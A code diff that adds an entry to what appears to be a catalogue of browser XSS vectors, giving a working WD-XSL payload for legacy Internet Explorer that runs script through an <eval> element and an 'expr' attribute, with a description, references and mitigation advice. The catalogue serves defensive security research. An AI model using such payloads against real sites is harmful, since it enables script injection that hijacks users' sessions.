@@ -4696,7 +4696,7 @@ var items =
         'tags'      : ['xss', 'comments', 'internet explorer', 'backtick'],
         'reporter'  : 'jackmasa'
     },
-        { /* ID 134 - "<% %>" and "<!-- -->" inside plaintext tags */
+    { /* ID 134 - "<% %>" and "<!-- -->" inside plaintext tags */
         'id'        : 134,
         'category'  : 'html',
         'name'      : {
@@ -4730,5 +4730,43 @@ var items =
         },
         'tags'      : ['xss', 'plaintext', 'internet explorer', 'comment', 'SGML', 'escape'],
         'reporter'  : 'sirdarckcat, wpulog'
+    },
+    { /* ID 135 - Executing JavaScript with WD-XSL, <eval> elements and "expr" attributes */
+        'id'        : 135,
+        'category'  : 'xml',
+        'name'      : {
+            'en'    : 'Executing JavaScript with WD-XSL, <eval> elements and "expr" attributes',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'data'      : '<?xml-stylesheet type="text/xsl" href="#" ?>\r\n<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">\r\n<template match="/">\r\n<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval>\r\n<if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if>\r\n</template>\r\n</stylesheet>',
+        'description' : {
+            'en'    : 'Internet Explorer, when loading an XML document in an older document mode, allows the use of a legacy XSL version called WD-XSL. This version, shipped with several proprietary extras, allows execution of JavaScript and other script code in very uncommon ways. The browser for instance supports an <eval> element and "expr" attributes that can directly be fed with script code or references to existing JavaScript and XMLDOM methods. Other than MSXSL script, direct DOM access is possible with the use of WD-XSL.',
+            'ja'    : '',
+            'ru'    : '', 
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'urls'      : [
+        				'http://web.archive.org/web/20000816185012/http://msdn.microsoft.com/xml/reference/xsl/XSLElements.asp', 
+        				'http://web.archive.org/web/20000816000901/http://msdn.microsoft.com/xml/reference/xsl/xslmethods.asp'
+        			],
+        'howtofix'  : {
+            'en'    : 'Websites rendered in XML- or XML-like MIME types should not allow untrusted input without heavy filtering. Unknown elements can cause unexpected script execution depending on browser and render mode. The use of custom namespaces in user generated input should be prohibited.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'browsers'  : {
+            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0', '10.0']
+        },
+        'tags'      : ['xss', 'xslt', 'internet explorer', 'xml', 'wdxsl', 'legacy'],
+        'reporter'  : '.mario'
     }
 ]
